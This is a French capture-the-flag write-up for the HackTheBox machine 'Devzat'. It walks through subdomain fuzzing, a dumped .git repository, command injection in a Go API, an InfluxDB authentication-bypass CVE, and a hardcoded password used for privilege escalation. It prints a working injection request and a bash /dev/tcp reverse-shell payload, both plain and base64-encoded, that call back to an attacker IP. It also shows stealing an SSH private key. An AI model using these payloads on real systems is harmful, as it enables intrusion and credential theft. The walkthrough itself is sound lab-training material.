# Devzat | Linux

<ins>Plateforme</ins>: **HackTheBox**\
<ins>Nom</ins>: **Devzat**\
<ins>Difficulté</ins>: **Medium**\
<ins>Infos</ins>: **ssh, port-forwarding**

## Scan | Nmap

![image](https://user-images.githubusercontent.com/68467919/155146623-6be18710-2758-4640-9910-e779bd5c8bea.png)

## Vhost

```bash
wfuzz -c -f enum/subdomains.txt -u http://devzat.htb -w /home/r0s3/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host:FUZZ.devzat.htb" --hw 26
```

![image](https://user-images.githubusercontent.com/68467919/155146692-1e7b41cc-b8a3-4360-bfd4-8695a1e40580.png)

Sous-domaine “pets”.

## SSH | Port 8000

![image](https://user-images.githubusercontent.com/68467919/155146752-649b06b1-4d55-4543-a717-37efd376bb78.png)

Repo Github de Devzat

[GitHub - quackduck/devzat: The devs are over here at devzat, chat over SSH!](http://github.com/quackduck/devzat)

## Port 80 | Apache

![image](https://user-images.githubusercontent.com/68467919/155146823-e5a54dc9-2560-4055-b418-78d229b9002c.png)

![image](https://user-images.githubusercontent.com/68467919/155146857-3ab7c208-1937-424f-83b6-0e68d523dadc.png)
Il est possible de se connecter sur le serveur SSH de la machine avec n’importe quel nom d’utilisateur.

## Pets | Sous-Domaine

![image](https://user-images.githubusercontent.com/68467919/155146967-64ffb283-eccc-4c81-9b31-94b2aa1589fc.png)

<aside>
💡 Quand une requête est effectuée, elle se fait sur /api/pet !

</aside>

Le sous-domaine a un fichier “.git” qui serait possible de dump avec git-dump.py

![image](https://user-images.githubusercontent.com/68467919/155147017-5bcc2a35-f855-4066-95a1-17b01e1813a3.png)

Ensuite, j’utilise l’extractor de GitTools pour extraire les données que j’ai récupéré.

![image](https://user-images.githubusercontent.com/68467919/155147054-5bfe52b4-015b-4c05-9e3c-c29ffc39fc58.png)

## 🤖 Analyse du code | Golang

Dans le fichier *main.go* une partie est intéressante selon moi : 

```go
func loadCharacter(species string) string {
	cmd := exec.Command("sh", "-c", "cat characteristics/"+species)
	stdoutStderr, err := cmd.CombinedOutput()
	if err != nil {
		return err.Error()
	}
	return string(stdoutStderr)
}
```

Pour mieux comprendre, je vais essayer d’expliquer le code.

Nous avons la fonction loadCharacter qui prend en paramètre species, de type string.

La variable **cmd** contient le retour de exec.Command qui va exécuter la commande “cat” dans le dossier characteristics.

L’une des vulnérabilités dont j’ai pensé en premier était une LFI. Essayer de cat /etc/passwd ou un fichier de configuration. Après plusieurs tentatives, je pense essayer une OS Injection.

Si j’envois la requête suivante : 

```bash
POST /api/pet HTTP/1.1
Host: pets.devzat.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://pets.devzat.htb/
Content-Type: text/plain;charset=UTF-8
Origin: http://pets.devzat.htb
Content-Length: 81
Connection: close

{"name":"aaaa",
"species":"cat;ping -c 5 10.10.14.5"
}
```

Je reçois bien des requêtes provenant de pets.devzat.htb : 

![image](https://user-images.githubusercontent.com/68467919/155147108-b99eba0d-a0e6-4b0e-b833-bc055793342a.png)
## Reverse-Shell

Tout d’abord, j’ai essayé un reverse-shell sans l’encoder en base64. Mais ça n’a pas fonctionné et je n’ai pas reçu de retour sur Netcat.

```bash
bash -i >& /dev/tcp/10.10.14.5/1337 0>&1 | bash
```

Le payload suivant fonctionne et me fait pop un reverse-shell : 

```bash
echo "bash -i >& /dev/tcp/10.11.14.5/1337 0>&1" | base64
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzEzMzcgMD4mMQo=" | base64 -d | bash
```

En premier temps, j’affiche la string “*YmFzaC[...]MD4mMQo=*”, je la décode en base64 puis j’exécute la string décodé avec “bash”

![image](https://user-images.githubusercontent.com/68467919/155147194-6a4defd6-5f1d-4541-b61e-8b4b6b85d26b.png)

Après avoir fait spawn un shell “stable” avec la commande : 

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm
```

Je me rend dans le /home/patrick et m’appercoi qu’un dossier /.ssh est présent avec un id_rsa à l’intérieur ! Super, nous pouvons voler la clé privé de Patrick pour se connecter à sa session SSH ! 

```bash
ssh -i id_rsa patrick@devzat.htb
```

![image](https://user-images.githubusercontent.com/68467919/155147248-414720bd-d089-4bb9-b588-13cd80b29950.png)

## SSH | Port 22

### LinPeas

Quelques ports intéressants notamment le “8086”.

![image](https://user-images.githubusercontent.com/68467919/155147296-ace73a89-7ab4-47b8-967a-a8ea6b89ce90.png)
Après avoir effectué un local port-forwarding sur le port 8086, j’obtiens cette page : 

![image](https://user-images.githubusercontent.com/68467919/155147329-f7c46cd2-02e8-48b7-820e-4cbe8edc72ca.png)
Après énumération : 

![image](https://user-images.githubusercontent.com/68467919/155147409-873cfa9c-78e8-424b-99c5-8dce8e767eaf.png)

Scan nmap sur le port local pour connaître quel service tourne.

![image](https://user-images.githubusercontent.com/68467919/155147439-765d985e-c0c8-476b-8b61-ce95c973c95d.png) \
Après une recherche sur internet, je tombe sur ce repo Github.

[GitHub - LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933: InfluxDB CVE-2019-20933 vulnerability exploit](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933)

![image](https://user-images.githubusercontent.com/68467919/155147951-884a5933-fd4f-4091-8473-f464e54bd317.png)

Maintenant, nous devons selectionner la base de donnée que nous voulons explorer.

Pour énumérer notre base de donnée, nous allons nous référer au cheat-sheet suivant : 

[InfluxDB command cheatsheet](https://songrgg.github.io/operation/influxdb-command-cheatsheet/)

![image](https://user-images.githubusercontent.com/68467919/155148005-9e7651eb-7212-4e89-8096-8f95f460212e.png)

![image](https://user-images.githubusercontent.com/68467919/155148053-dbea62e9-5868-4e9a-b24f-f4fbd175990d.png)

Super, nous avons le mot de passe de plusieurs utilisateurs. Un en particulier est intéressant car je l’ai trouvé en énumérant la machine depuis le compte de Patrick. Testons donc de nous connecter au compte de Catherine !

![image](https://user-images.githubusercontent.com/68467919/155148119-6269e757-063d-46ce-bca2-9545591e018b.png)

Dans le répertoire /var/backups, nous trouvons deux fichiers .zip du nom de “devzat-dev.zip” et “devzat-main.zip”. 

Après les avoir décompresser, nous remarquons que les deux fichiers sont similaires. J’ai cherché pendant un long moment à comprendre ce qu’il fallait faire et je suis tombé sur ce code là, dans le fichier dev/devzat.go 

```go
import (
	port = 8443
		port, err = strconv.Atoi(os.Getenv("PORT"))
	fmt.Printf("Starting chat server on port %d\n", port)
		fmt.Sprintf("127.0.0.1:%d", port),
		u.writeln("patrick", "I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.")
```

Ce que nous comprenons ici, c’est qu’une instance du service SSH tourne sur le port 8443. C’est une bonne piste. 

Pour se faciliter la tâche, la commande diff peut être utilisée pour connaître les différences entre les deux dossiers spécifiés.

```bash
diff dev/ main/
```

Les résultats sont nombreux, mais le plus important est : 

```go
commands = []commandInfo{clear, message, users, all, exit, bell, room, kick, id, _commands, nick, color, timezone, emojis, help, tictactoe, hangman, shrug, asciiArt, exampleCode, file}

// Check my secure password
if pass != "CeilingCatStillAThingIn2021?" {
	u.system("You did provide the wrong password")
	return
	}
}

func fileCommand(u *user, args []string) {
	if len(args) < 1 {
		u.system("Please provide file to print and the password")
	 	return
}
 
if len(args) < 2 {
 	u.system("You need to provide the correct password to use this function")
 	return
}
 
 	path := args[0]
 	pass := args[1]
```

Nous pouvons déjà remarquer que nous avons une liste de commande, une retient mon attention, “file”, un mot de passe est écrit en clair dans le code également. 

Depuis la session de Catherine, essayons donc de nous connecter au service SSH et d’essayer de lire le contenu du fichier root.txt

![image](https://user-images.githubusercontent.com/68467919/155148273-2081b0c5-a74e-44e7-9383-4217685d4f3a.png)

**FLAGGED !!!**
